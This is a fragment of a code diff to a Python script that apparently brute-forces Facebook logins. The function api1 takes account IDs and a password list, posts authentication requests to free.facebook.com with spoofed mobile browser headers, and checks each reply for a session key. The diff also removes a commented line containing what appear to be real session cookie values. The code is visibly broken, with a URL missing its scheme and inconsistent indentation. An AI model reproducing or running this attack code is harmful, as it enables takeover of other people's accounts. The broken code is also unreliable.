@@ -310,30 +310,28 @@ def api1(ids,names,passlist):
                                 'generate_machine_id':'1',
                                 'fb_api_req_friendly_name':'authenticate',
                                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                        }
-                        headers = {
-    'authority': 'free.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=ArKsZWv7_pODM33xU9pO9wn8; sb=O4HHZVZCZBeHd-HrwGaHJfg4; ps_l=0; ps_n=0; wd=360x668; fr=0uLU95pY2NvjTxxgc.AWVKTH3TZXZ96WFp8366NROXgKY.BlrLIC..AAA.0.0.Blx_bQ.AWVAkaON3n8',
-    'dpr': '2',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"RMX2189"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
+                                 }
+                                 headers = {
+                                'authority': 'free.facebook.com',
+                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                                'accept-language': 'en-US,en;q=0.9',
+                                'cache-control': 'max-age=0',
+                                'dpr': '2',
+                                 'sec-ch-prefers-color-scheme': 'light',
+                                 'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+                                 'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+                                 'sec-ch-ua-mobile': '?1',
+                                 'sec-ch-ua-model': '"RMX2189"',
+                                 'sec-ch-ua-platform': '"Android"',
+                                 'sec-ch-ua-platform-version': '"11.0.0"',
+                                  'sec-fetch-dest': 'document',
+                                  'sec-fetch-mode': 'navigate',
+                                  'sec-fetch-site': 'none',
+                                  'sec-fetch-user': '?1',
+                                   'upgrade-insecure-requests': '1',
+                                   'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+                                    'viewport-width': '980',
 }
-                                'Content-Length': str(random.randint(600, 1000)),}
                         url = 'free.facebook.com'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
